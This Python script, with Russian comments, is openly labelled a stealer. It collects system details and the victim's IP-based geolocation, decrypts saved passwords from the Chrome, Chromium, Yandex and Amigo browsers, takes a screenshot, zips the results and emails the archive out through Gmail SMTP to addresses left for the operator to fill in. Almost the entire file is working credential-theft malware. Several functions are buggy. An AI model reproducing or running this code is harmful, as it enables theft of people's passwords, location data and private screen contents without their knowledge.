import os
from Crypto.Hash import SHA512
import sqlite3
import win32crypt
import email, ssl
import shutil
import requests
import zipfile
import getpass
import ip2geotools
import win32api
import platform
import tempfile
import smtplib
import time
import cv2
import sys
from PIL import ImageGrab
from email.mime.multipart import MIMEMultipart 
from email.mime.base import MIMEBase 
from email.message import Message
from email.mime.multipart import MIMEBase
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate
from email import encoders
from Tools.demo.mcast import sender
from ip2geotools.databases.noncommercial import DbIpCity
from os.path import basename
from smtplib import SMTP
from email.header import Header
from email.utils import parseaddr, formataddr
from base64 import encodebytes
import random
################################################################################
#                              ВСЕ ДАННЫЕ И ЛОКАЦИЯ                            #
################################################################################
drives = str(win32api.GetLogicalDriveStrings())
drives = str(drives.split('\000')[:-1])
response = DbIpCity.get(requests.get("https://ramziv.com/ip").text, api_key='free')
all_data = "Time: " + time.asctime() + '\n' + "Кодировка ФС: " + sys.getfilesystemencoding() + '\n' + "Cpu: " + platform.processor() + '\n' + "Система: " + platform.system() + ' ' + platform.release() + '\nIP: '+requests.get("https://ramziv.com/ip").text+'\nГород: '+response.city+'\nGen_Location:' + response.to_json() + '\nДиски:' + drives
file = open(os.getenv("APPDATA") + '\\alldata.txt', "w+") 
file.write(all_data)
file.close()
################################################################################
#                              GOOGLE PASSWORDS                                #
################################################################################
def Chrome(): 
   text = 'Passwords Chrome:' + '\n' 
   text += 'URL | LOGIN | PASSWORD' + '\n' 
   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data'): 
       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2') 
       cursor = conn.cursor()
       cursor.execute('SELECT action_url, username_value, password_value FROM logins')
       for result in cursor.fetchall():
           password = win32crypt.CryptUnprotectData(result[2])[1].decode() 
           login = result[1]
           url = result[0]
           if password != '':
               text += url + ' | ' + login + ' | ' + password + '\n' 
   return text
file = open(os.getenv("APPDATA") + '\\google_pass.txt', "w+")
file.write(str(Chrome()) + '\n')
file.close()
################################################################################
#                              GOOGLE Cookies                                  #
################################################################################
def Chrome_cockie():
   pass
################################################################################
#                              CHROMIUM PASSWORDS                              #
################################################################################
def chromium():
   textch ='Chromium Passwords:' + '\n'
   textch += 'URL | LOGIN | PASSWORD' + '\n'
   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default'):
       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Login Data', os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Login Data2')
       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Login Data2')
       cursor = conn.cursor()
       cursor.execute('SELECT action_url, username_value, password_value FROM logins')
       for result in cursor.fetchall():
           password = win32crypt.CryptUnprotectData(result[2])[1].decode()
           login = result[1]
           url = result[0]
           if password != '':
               textch += url + ' | ' + login + ' | ' + password + '\n'
               return textch
file = open(os.getenv("APPDATA") + '\\chromium.txt', "w+")
file.write(str(chromium()) + '\n')
file.close()
################################################################################
#                              YANDEX PASSWORDS                                #
################################################################################
def Yandexpass():
    textyp = 'Passwords Yandex:' + '\n'
    textyp += 'URL | LOGIN | PASSWORD' + '\n'
    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Ya Login Data.db'):
        shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Ya Login Data.db', os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Ya Login Data2.db')
        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Yandexe\\YandexBrowser\\User Data\\Default\\Ya Login Data2.db')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(result[2])[1].decode()
            login = result[1]
            url = result[0]
            if password != '':
                textyp += url + ' | ' + login + ' | ' + password + '\n'
    return textyp
file = open(os.getenv("APPDATA") + '\\yandex_passwords.txt', "w+")
file.write(str(Yandexpass()) + '\n')
file.close()
################################################################################
#                              AMIGO PASSWORDS                                 #
################################################################################
def Amigo():
   textam = 'Passwords Amigo:' + '\n'
   textam += 'URL | LOGIN | PASSWORD' + '\n'
   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Login Data'):
       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Login Data', os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Login Data2')
       conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data\\Default\\Login Data2')
       cursor = conn.cursor()
       cursor.execute('SELECT action_url, username_value, password_value FROM logins')
       for result in cursor.fetchall():
           password = win32crypt.CryptUnprotectData(result[2])[1].decode()
           login = result[1]
           url = result[0]
           if password != '':
               textam += url + ' | ' + login + ' | ' + password + '\n'
file = open(os.getenv("APPDATA") + '\\amigo_pass.txt', "w+")
file.write(str(Amigo()) + '\n')
file.close()
################################################################################
#                             SCREEN                                           #
################################################################################
screen = ImageGrab.grab()
screen.save(os.getenv("APPDATA") + '\\sreenshot.jpg')
################################################################################
#                              PACKING TO ZIP                                  #
################################################################################
zname = r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Local\\Temp\\LOG.zip'
NZ = zipfile.ZipFile(zname,'w')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\firefox_pass.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\firefox_cookies.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\yandex_passwords.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\alldata.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\google_pass.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\google_cookies.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\chromium.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\chromium_cookies.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\amigo_pass.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\amigo_cookies.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\opera_pass.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\opera_cookies.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\filezilla.txt')
NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\sreenshot.jpg')
NZ.close() 
################################################################################
#                              DOC-НАШ ZIP                                     #
################################################################################
doc = 'C:\\Users\\' + getpass.getuser() + '\\AppData\\Local\\Temp\\LOG.zip'
################################################################################
#                              ОТПРАВКА                                        #
################################################################################
'↑Stealler by Andrew_Shipunov↑'.encode('utf-8')
msgtext = MIMEText('↑Stealler by Andrew_Shipunov↑'.encode('utf-8'), 'plain', 'utf-8')
msg = MIMEMultipart()
msg['From'] = 'ваша новая почта@gmail.com'
msg['To'] = 'почта куда отправится'
msg['Subject'] = getpass.getuser() + '-PC'
msg.attach(msgtext)
################################################################################
#                              СОЗДАНИЕ ВЛОЖЕНИЯ                               #
################################################################################
part = MIMEBase('application', "zip")
b = open(doc, "rb").read()
bs = encodebytes(b).decode()
part.set_payload(bs)
part.add_header('Content-Transfer-Encoding', 'base64')
part.add_header('Content-Disposition', 'attachment; filename="LOG.zip"')
msg.attach(part)
################################################################################
#                              ОТПРАВКА вам       #
################################################################################
s = smtplib.SMTP('smtp.gmail.com', 587)
s.starttls()                                   
s.login('новая ваша почта гмаил', 'пароль от новой почты гмаил')
s.sendmail('новая ваша почта гмаил', 'почта куда отправится', msg.as_string())
s.quit()
i = input()
